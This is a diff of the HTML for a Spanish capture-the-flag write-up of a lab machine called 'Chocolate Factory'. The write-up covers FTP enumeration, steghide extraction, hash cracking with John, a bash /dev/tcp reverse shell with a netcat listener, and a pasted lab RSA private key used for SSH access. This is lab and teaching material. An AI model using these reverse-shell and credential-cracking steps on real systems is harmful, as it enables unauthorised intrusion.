+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="err">&#39;</span>_<span class="p">;</span>-----------------<span class="sb">`</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\|</span>______________________<span class="p">;</span>________________<span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     small hint from Mr.Wonka : Look somewhere <span class="k">else</span>, its not here! <span class="p">;</span><span class="o">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    hope you wont drown Augustus<span class="s2">&#34;
+</span></span></span></code></pre></div><table>
 <thead>
 <tr>
 <th style="text-align:center">Parámetro</th>
@@ -1349,9 +1348,9 @@ PORT    STATE SERVICE     VERSION
             style="text-decoration-line: none !important;" href="#puerto-80" aria-label="Anchor">#</a></span>        
     
 </h2><p>Con el whatweb podemos ver más información de la web</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ whatweb 10.10.250.47
-http://10.10.250.47 <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Apache<span class="o">[</span>2.4.29<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP<span class="o">[</span>10.10.250.47<span class="o">]</span>, PasswordField<span class="o">[</span>password<span class="o">]</span>
-</code></pre></div><p>Al entrar a la web hay un panel de login, e probado con admin:admin y las típicas credenciales pero nada.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ whatweb 10.10.250.47
+</span></span><span class="line"><span class="cl">http://10.10.250.47 <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Apache<span class="o">[</span>2.4.29<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP<span class="o">[</span>10.10.250.47<span class="o">]</span>, PasswordField<span class="o">[</span>password<span class="o">]</span>
+</span></span></code></pre></div><p>Al entrar a la web hay un panel de login, e probado con admin:admin y las típicas credenciales pero nada.</p>
 <p>El wappalayzer no reporta nada interesante.</p>
 <p>
 
@@ -1389,17 +1388,17 @@ http://10.10.250.47 <span class="o">[</span><span class="m">200</span> OK<span c
             style="text-decoration-line: none !important;" href="#puerto-21" aria-label="Anchor">#</a></span>        
     
 </h2><p>El nmap reporto que se podía entrar al puerto 21 como anónimo (<code>ftp-anon: Anonymous FTP login allowed</code>)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ ftp 10.10.250.47
-Connected to 10.10.250.47.
-<span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
-Name <span class="o">(</span>10.10.250.47:d3b0<span class="o">)</span>: anonymous
-<span class="m">331</span> Please specify the password.
-Password: 
-<span class="m">230</span> Login successful.
-Remote system <span class="nb">type</span> is UNIX.
-Using binary mode to transfer files.
-ftp&gt; 
-</code></pre></div><p>Dentro solo hay una foto <code>gum_room.jpg</code>, con <code>get gum_room.jpg</code> nos la podemos pasar a nuestra máquina, la foto es la siguiente:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ftp 10.10.250.47
+</span></span><span class="line"><span class="cl">Connected to 10.10.250.47.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.250.47:d3b0<span class="o">)</span>: anonymous
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; 
+</span></span></code></pre></div><p>Dentro solo hay una foto <code>gum_room.jpg</code>, con <code>get gum_room.jpg</code> nos la podemos pasar a nuestra máquina, la foto es la siguiente:</p>
 <p>
 
 
@@ -1431,14 +1430,14 @@ ftp&gt;
 <p>Para ver si hay algo oculto en la foto usamos steghide</p>
 <p>Steghide es un software de esteganografía de código abierto que permite ocultar un archivo secreto en un archivo de imagen o audio.</p>
 <p>No notarás ningún cambio en la imagen o el archivo de audio. Sin embargo, el archivo secreto estará dentro de la imagen original o el archivo de audio. Es un software de línea de comando.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Si no tienes instalado el &#34;steghide&#34; lo puedes descargar con</span>
-sudo apt install steghide
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ steghide extract -sf gum_room.jpg
-Anotar salvoconducto: 
-anot� los datos extra�dos e/<span class="s2">&#34;b64.txt&#34;</span>.
-</code></pre></div><p>Ahora se a creado un archivo b64.txt que está encriptado con base64</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cat b64.txt <span class="p">|</span> base64 -d &gt; decode.txt
-</code></pre></div><p>Ahora en el decode.txt ya está el contenido</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Si no tienes instalado el &#34;steghide&#34; lo puedes descargar con</span>
+</span></span><span class="line"><span class="cl">sudo apt install steghide
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ steghide extract -sf gum_room.jpg
+</span></span><span class="line"><span class="cl">Anotar salvoconducto: 
+</span></span><span class="line"><span class="cl">anot� los datos extra�dos e/<span class="s2">&#34;b64.txt&#34;</span>.
+</span></span></code></pre></div><p>Ahora se a creado un archivo b64.txt que está encriptado con base64</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat b64.txt <span class="p">|</span> base64 -d &gt; decode.txt
+</span></span></code></pre></div><p>Ahora en el decode.txt ya está el contenido</p>
 <pre tabindex="0"><code>...
 ...
 charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
@@ -1447,7 +1446,7 @@ charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FO
 <p>Al final de todo se puede ver el usuario charlie, junto a un hash sha512 (se puede saber que tipo es porque empieza con $6$)</p>
 <p>Para romper el hash vamos a usar John the Ripper, que es una herramienta para recuperación de contraseñas. Originalmente desarrollado para el sistema operativo Unix</p>
 <pre tabindex="0"><code>sudo apt install john
-echo &quot;hash&quot; &gt; myhash.hash
+echo &#34;hash&#34; &gt; myhash.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt mihash.hash
 john --show mihash.hash
 </code></pre><div id="homephp" class="anchor">home.php></div>
@@ -1495,8 +1494,8 @@ john --show mihash.hash
             style="text-decoration-line: none !important;" href="#reverse-shell" aria-label="Anchor">#</a></span>        
     
 </h2><p>Primero nos ponemos en escucha por el puerto 443</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -nlvp <span class="m">443</span>
-</code></pre></div><p>Intentamos crear una reverse shell mandando <code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1</code>, pero no recibimos nada, probamos añadiendo (bash -c &ldquo;&quot;) de tal forma que quede así <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&quot;</code> Ahora ya si</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">443</span>
+</span></span></code></pre></div><p>Intentamos crear una reverse shell mandando <code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1</code>, pero no recibimos nada, probamos añadiendo (bash -c &ldquo;&rdquo;) de tal forma que quede así <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&quot;</code> Ahora ya si</p>
 <div id="tratamiento-de-la-tty" class="anchor">Tratamiento de la tty></div>
 <h2 class="relative group">Tratamiento de la tty 
     <span
@@ -1505,14 +1504,14 @@ john --show mihash.hash
             style="text-decoration-line: none !important;" href="#tratamiento-de-la-tty" aria-label="Anchor">#</a></span>        
     
 </h2><p>Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">script /dev/null -c bash
-</code></pre></div><p>ctrl + z</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">reset
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">xterm
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-</code></pre></div><div id="escalada-a-charlie" class="anchor">Escalada a charlie></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span></code></pre></div><p>ctrl + z</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reset
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xterm
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></div><div id="escalada-a-charlie" class="anchor">Escalada a charlie></div>
 <h2 class="relative group">Escalada a charlie 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
@@ -1522,41 +1521,41 @@ john --show mihash.hash
 </h2><p>En el /home/charlie hay un user.txt, pero no tenemos acceso para leerlo. Hay un archivo llamado teleport ahí hay una RSA private key.</p>
 <p>Una llave RSA es una llave generada por el algoritmo RSA. Esta llave está compuesta por dos partes, una parte pública y otra parte privada.</p>
 <p>Desde nuestra máquina guardamos esa key en un archivo llamado id_rsa</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ cat id_rsa
-───────┬──────────────────────────────────────────────────────────────────────────────────
-       │ File: id_rsa
-───────┼──────────────────────────────────────────────────────────────────────────────────
-   <span class="m">1</span>   │ -----BEGIN RSA PRIVATE KEY-----
-   <span class="m">2</span>   │ MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
-   <span class="m">3</span>   │ 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
-   <span class="m">4</span>   │ L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
-   <span class="m">5</span>   │ B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
-   <span class="m">6</span>   │ fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
-   <span class="m">7</span>   │ RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
-   <span class="m">8</span>   │ Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
-   <span class="m">9</span>   │ zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
-  <span class="m">10</span>   │ w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
-  <span class="m">11</span>   │ kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
-  <span class="m">12</span>   │ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
-  <span class="m">13</span>   │ EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
-  <span class="m">14</span>   │ RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
-  <span class="m">15</span>   │ uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
-  <span class="m">16</span>   │ KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
-  <span class="m">17</span>   │ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
-  <span class="m">18</span>   │ znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
-  <span class="m">19</span>   │ la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
-  <span class="m">20</span>   │ FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
-  <span class="m">21</span>   │ 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
-  <span class="m">22</span>   │ 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
-  <span class="m">23</span>   │ ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
-  <span class="m">24</span>   │ Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
-  <span class="m">25</span>   │ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
-  <span class="m">26</span>   │ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-  <span class="m">27</span>   │ -----END RSA PRIVATE KEY-----
-───────┴──────────────────────────────────────────────────────────────────────────────────
-</code></pre></div><p>Ahora nos podemos conectar por ssh como charlie</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -i id_rsa charlie@10.10.94.87
-</code></pre></div><p>Ya somos charlie y podemos ver la flag de usuario</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cat id_rsa
+</span></span><span class="line"><span class="cl">───────┬──────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">       │ File: id_rsa
+</span></span><span class="line"><span class="cl">───────┼──────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>   │ -----BEGIN RSA PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>   │ MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+</span></span><span class="line"><span class="cl">   <span class="m">3</span>   │ 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+</span></span><span class="line"><span class="cl">   <span class="m">4</span>   │ L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+</span></span><span class="line"><span class="cl">   <span class="m">5</span>   │ B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+</span></span><span class="line"><span class="cl">   <span class="m">6</span>   │ fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+</span></span><span class="line"><span class="cl">   <span class="m">7</span>   │ RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+</span></span><span class="line"><span class="cl">   <span class="m">8</span>   │ Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+</span></span><span class="line"><span class="cl">   <span class="m">9</span>   │ zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+</span></span><span class="line"><span class="cl">  <span class="m">10</span>   │ w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+</span></span><span class="line"><span class="cl">  <span class="m">11</span>   │ kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+</span></span><span class="line"><span class="cl">  <span class="m">12</span>   │ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+</span></span><span class="line"><span class="cl">  <span class="m">13</span>   │ EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+</span></span><span class="line"><span class="cl">  <span class="m">14</span>   │ RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+</span></span><span class="line"><span class="cl">  <span class="m">15</span>   │ uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+</span></span><span class="line"><span class="cl">  <span class="m">16</span>   │ KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+</span></span><span class="line"><span class="cl">  <span class="m">17</span>   │ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+</span></span><span class="line"><span class="cl">  <span class="m">18</span>   │ znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+</span></span><span class="line"><span class="cl">  <span class="m">19</span>   │ la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
+</span></span><span class="line"><span class="cl">  <span class="m">20</span>   │ FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
+</span></span><span class="line"><span class="cl">  <span class="m">21</span>   │ 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
+</span></span><span class="line"><span class="cl">  <span class="m">22</span>   │ 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
+</span></span><span class="line"><span class="cl">  <span class="m">23</span>   │ ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
+</span></span><span class="line"><span class="cl">  <span class="m">24</span>   │ Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
+</span></span><span class="line"><span class="cl">  <span class="m">25</span>   │ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
+</span></span><span class="line"><span class="cl">  <span class="m">26</span>   │ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
+</span></span><span class="line"><span class="cl">  <span class="m">27</span>   │ -----END RSA PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">───────┴──────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><p>Ahora nos podemos conectar por ssh como charlie</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i id_rsa charlie@10.10.94.87
+</span></span></code></pre></div><p>Ya somos charlie y podemos ver la flag de usuario</p>
 <div id="escalada-root" class="anchor">Escalada root></div>
 <h2 class="relative group">Escalada root 
     <span
@@ -1608,31 +1607,31 @@ john --show mihash.hash
             style="text-decoration-line: none !important;" href="#rootpy-puertos-100---125" aria-label="Anchor">#</a></span>        
     
 </h2><p>En el directorio /root  hay un archivo llamado root.py el cual al ejecutarlo <code>pyhton root.py</code> pide una key: Volviendo al nmap que encontró 25 puertos tcp en los cuales todos pone lo mismo:</p>
-<pre tabindex="0"><code>&quot;Welcome to chocolate room!! 
+<pre tabindex="0"><code>&#34;Welcome to chocolate room!! 
 |     ___.---------------.
-|     .'__'__'__'__'__,` . ____ ___ \r
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
 |     _:\x20 |:. \x20 ___ \r
-|     \'__'__'__'__'_`.__| `. \x20 ___ \r
-|     \'__'__'__\x20__'_;-----------------`
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
 |     \|______________________;________________|
 |     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-|_    hope you wont drown Augustus&quot;
+|_    hope you wont drown Augustus&#34;
 </code></pre><p>Menos uno, el 113, que pone:</p>
 <pre tabindex="0"><code>http://localhost/key_rev_key &lt;- You will find the key here!!!
 </code></pre><p>Cuando entramos al <code>http://10.10.94.87/key_rev_key</code> nos descarga un archivo llamado <code>key_rev_key</code>, al abrirlo nos pide un nombre, e probado con charlie, Mr.Wonka, root, admin, etc&hellip; pero nada.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">chmod +x key_rev_key
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ ./key_rev_key
-Enter your name: charlie
-Bad name!
-</code></pre></div><p>Al hacer un nano al archivo hay una línea que pone:</p>
-<pre tabindex="0"><code>congratulations you have found the key:   ^@^@^@^@b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='^@`
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x key_rev_key
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ./key_rev_key
+</span></span><span class="line"><span class="cl">Enter your name: charlie
+</span></span><span class="line"><span class="cl">Bad name!
+</span></span></code></pre></div><p>Al hacer un nano al archivo hay una línea que pone:</p>
+<pre tabindex="0"><code>congratulations you have found the key:   ^@^@^@^@b&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;^@`
 </code></pre><p>¡Ya tenemos la key!</p>
 <p>También hay otra línea en la cual se puede ver el nombre correcto</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Enter your name:  %s  laksdhfas  
-</code></pre></div><pre tabindex="0"><code>❯ ./key_rev_key
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Enter your name:  %s  laksdhfas  
+</span></span></code></pre></div><pre tabindex="0"><code>❯ ./key_rev_key
 Enter your name: laksdhfas
 
- congratulations you have found the key:   b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+ congratulations you have found the key:   b&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;
  Keep its safe
 </code></pre><div id="root-flag" class="anchor">Root flag></div>
 <h2 class="relative group">Root flag 
@@ -1654,7 +1653,7 @@ Enter your name: laksdhfas
       </script>
       
       
-      <script type="text/javascript" src="/js/page.min.e81cc025d61acff630909044f33df3ded3f4b7c917bf3db3ab7bef2ed26c7baf9be84ffedc2c4ee9dff8bbc1f3ad63ccb7d489d7f43e56a00a2b14bdeaaee7e1.js" integrity="sha512-6BzAJdYaz/YwkJBE8z3z3tP0t8kXvz2zq3vvLtJse6&#43;b6E/&#43;3CxO6d/4u8HzrWPMt9SJ1/Q&#43;VqAKKxS96q7n4Q=="></script>
+      <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
   </section>
   <footer class="pt-8 max-w-prose print:hidden">
 
@@ -1811,7 +1810,7 @@ Enter your name: laksdhfas
   </script>
   
   
-  <script type="text/javascript" src="/js/process.min.e7c3599dbb1cedb20b622602837cde52ffd76433ccf3544defb2f071860d81580f68eb150111f9b7fabdeda3aacb803d34d2d8a0a0a9f10410e9d20b98b1f4a1.js" integrity="sha512-58NZnbsc7bILYiYCg3zeUv/XZDPM81RN77LwcYYNgVgPaOsVARH5t/q97aOqy4A9NNLYoKCp8QQQ6dILmLH0oQ=="></script>
+  <script type="text/javascript" src="/js/process.min.2166d3adac1679c00a75161830ab5725d3efc0e3d3f8c2453fb01d0907948436c25f0f8a7ad824322fa22f3f9c85fd4d0a1d5c856f53b862157da25a57dc3d52.js" integrity="sha512-IWbTrawWecAKdRYYMKtXJdPvwOPT&#43;MJFP7AdCQeUhDbCXw&#43;KetgkMi&#43;iLz&#43;chf1NCh1chW9TuGIVfaJaV9w9Ug=="></script>
   
   
 </footer><div
